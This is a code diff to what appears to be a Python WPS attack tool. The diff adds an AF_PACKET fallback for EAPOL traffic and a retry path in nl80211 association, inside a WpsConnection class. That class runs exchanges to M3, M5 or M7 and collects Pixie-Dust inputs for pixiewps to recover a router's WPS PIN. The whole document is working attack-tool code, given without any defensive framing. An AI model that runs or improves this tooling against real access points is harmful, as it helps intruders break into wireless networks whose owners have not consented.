@@ -464,6 +464,28 @@ class EapolPort:
         return frame
 
     def close(self):
+        # The underlying socket is the connection owner; _drive closes it.
+        pass
+
+
+class EapolSocket:
+    """Fallback EAPOL transport over AF_PACKET (drivers without control-port-over-nl80211)."""
+
+    def __init__(self, interface, peer_mac, timeout=8):
+        self.interface = interface
+        self.peer_mac = peer_mac
+        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM, socket.htons(ETH_P_PAE))
+        self.sock.bind((interface, ETH_P_PAE))
+        self.sock.settimeout(timeout)
+
+    def send(self, frame):
+        self.sock.sendto(frame, (self.interface, ETH_P_PAE, 0, 0, self.peer_mac))
+
+    def recv(self):
+        data, _ = self.sock.recvfrom(2048)
+        return data
+
+    def close(self):
         try:
             self.sock.close()
         except OSError:
@@ -522,9 +544,10 @@ def _lookup_freq(interface, bssid):
 def associate(interface, bssid_bytes, ssid_bytes, freq=0, verbose=False):
     """Associate in MANAGED mode via nl80211 NL80211_CMD_CONNECT (no monitor mode).
 
-    Returns (sock, family_id, ifindex). The socket OWNS the connection
-    (SOCKET_OWNER) and also receives EAPOL via control-port-over-nl80211 — keep
-    it open for the whole WPS exchange; closing it tears the link down.
+    Returns (sock, family_id, ifindex, over_nl80211). The socket OWNS the
+    connection (SOCKET_OWNER) — keep it open for the whole WPS exchange; closing
+    it tears the link down. over_nl80211 is True if the driver accepted
+    control-port-over-nl80211 (EAPOL via nl80211); False means use AF_PACKET.
     Raises Nl80211Error on failure. LIVE PATH — needs root + a real adapter.
     """
     import nl80211_scan as nl
@@ -546,28 +569,39 @@ def associate(interface, bssid_bytes, ssid_bytes, freq=0, verbose=False):
                 sock.setsockopt(nl.SOL_NETLINK, nl.NETLINK_ADD_MEMBERSHIP, grp)
             except OSError:
                 pass
-        # Own the 802.1X control port AND have EAPOL delivered over nl80211 —
-        # FullMAC (most Android phone chips) do NOT pass EAPOL up via AF_PACKET.
-        attrs = (nl._attr(NL80211_ATTR_IFINDEX, struct.pack('=I', ifindex))
-                 + nl._attr(NL80211_ATTR_MAC, bssid_bytes)
-                 + nl._attr(NL80211_ATTR_SSID, ssid_bytes)
-                 + nl._attr(NL80211_ATTR_AUTH_TYPE, struct.pack('=I', NL80211_AUTHTYPE_OPEN_SYSTEM))
-                 + nl._attr(NL80211_ATTR_IE, wsc_assoc_ie())
-                 + nl._attr(NL80211_ATTR_CONTROL_PORT, b'')
-                 + nl._attr(NL80211_ATTR_CONTROL_PORT_OVER_NL80211, b'')
-                 + nl._attr(NL80211_ATTR_CONTROL_PORT_ETHERTYPE, struct.pack('=H', ETH_P_PAE))
-                 + nl._attr(NL80211_ATTR_SOCKET_OWNER, b''))
+        base = (nl._attr(NL80211_ATTR_IFINDEX, struct.pack('=I', ifindex))
+                + nl._attr(NL80211_ATTR_MAC, bssid_bytes)
+                + nl._attr(NL80211_ATTR_SSID, ssid_bytes)
+                + nl._attr(NL80211_ATTR_AUTH_TYPE, struct.pack('=I', NL80211_AUTHTYPE_OPEN_SYSTEM))
+                + nl._attr(NL80211_ATTR_IE, wsc_assoc_ie())
+                + nl._attr(NL80211_ATTR_CONTROL_PORT, b'')   # userspace owns 802.1X port
+                + nl._attr(NL80211_ATTR_SOCKET_OWNER, b''))
         if freq:
-            attrs += nl._attr(NL80211_ATTR_WIPHY_FREQ, struct.pack('=I', freq))
-        nl._send(sock, nl._genl_msg(family_id, NL80211_CMD_CONNECT, 10,
-                                    nl.NLM_F_REQUEST | nl.NLM_F_ACK, attrs))
-        for _ in nl._read_until_done(sock):   # consume the synchronous CONNECT ACK
-            pass
-        _wlog(verbose, '→ NL80211_CMD_CONNECT sent (open auth + WSC registrar IE)')
-        # CONNECT is asynchronous: wait for the result event and check its status.
-        _await_connect_result(sock, family_id, verbose)
-        _wlog(verbose, '← CONNECT result: associated (status 0)')
-        return sock, family_id, ifindex
+            base += nl._attr(NL80211_ATTR_WIPHY_FREQ, struct.pack('=I', freq))
+        over_nl80211 = (nl._attr(NL80211_ATTR_CONTROL_PORT_OVER_NL80211, b'')
+                        + nl._attr(NL80211_ATTR_CONTROL_PORT_ETHERTYPE, struct.pack('=H', ETH_P_PAE)))
+
+        # Prefer control-port-over-nl80211 (FullMAC EAPOL); fall back to AF_PACKET
+        # if the driver rejects it (EOPNOTSUPP / -95).
+        seq = 10
+        for use_nl, attrs, label in ((True, base + over_nl80211, 'control-port-over-nl80211'),
+                                     (False, base, 'AF_PACKET EAPOL')):
+            nl._send(sock, nl._genl_msg(family_id, NL80211_CMD_CONNECT, seq,
+                                        nl.NLM_F_REQUEST | nl.NLM_F_ACK, attrs))
+            seq += 1
+            try:
+                for _ in nl._read_until_done(sock):   # CONNECT command ACK
+                    pass
+            except nl.Nl80211Error as e:
+                if use_nl:
+                    _wlog(verbose, 'CONNECT with {} rejected ({}); falling back to AF_PACKET'.format(label, e))
+                    continue
+                raise
+            _wlog(verbose, '→ NL80211_CMD_CONNECT accepted ({})'.format(label))
+            _await_connect_result(sock, family_id, verbose)
+            _wlog(verbose, '← CONNECT result: associated (status 0)')
+            return sock, family_id, ifindex, use_nl
+        raise nl.Nl80211Error('CONNECT failed (no supported control-port mode)')
     except Exception:
         sock.close()
         raise
@@ -669,10 +703,15 @@ class WpsConnection:
         @stop — 'm3' (Pixie-Dust data), 'm5' (first-half check), or 'm7' (full).
         """
         self._log('Associating with {}…'.format(self.bssid))
-        sock, family_id, ifindex = associate(self.interface, _mac_bytes(self.bssid),
-                                             self.ssid.encode(), verbose=self.verbose)
-        self._log('Associated; EAPOL over nl80211 control port')
-        eapol = EapolPort(sock, family_id, ifindex, _mac_bytes(self.bssid), self.timeout)
+        peer = _mac_bytes(self.bssid)
+        sock, family_id, ifindex, over_nl80211 = associate(
+            self.interface, peer, self.ssid.encode(), verbose=self.verbose)
+        if over_nl80211:
+            self._log('EAPOL over nl80211 control port')
+            eapol = EapolPort(sock, family_id, ifindex, peer, self.timeout)
+        else:
+            self._log('EAPOL over AF_PACKET')
+            eapol = EapolSocket(self.interface, peer, self.timeout)
         try:
             eapol.send(eapol_start())
             self._log('→ EAPOL-Start')
@@ -738,8 +777,11 @@ class WpsConnection:
                         info['op_code'], mtype.hex() if mtype else 'none'))
             return reg
         finally:
-            # Closing the owning socket tears down the association (SOCKET_OWNER).
-            eapol.close()
+            eapol.close()        # AF_PACKET socket (no-op for the nl80211 transport)
+            try:
+                sock.close()     # connection owner — closing tears down the association
+            except OSError:
+                pass
 
     def pixie_dust(self):
         """Run M1..M3 and return the six pixiewps inputs (hex) or None."""
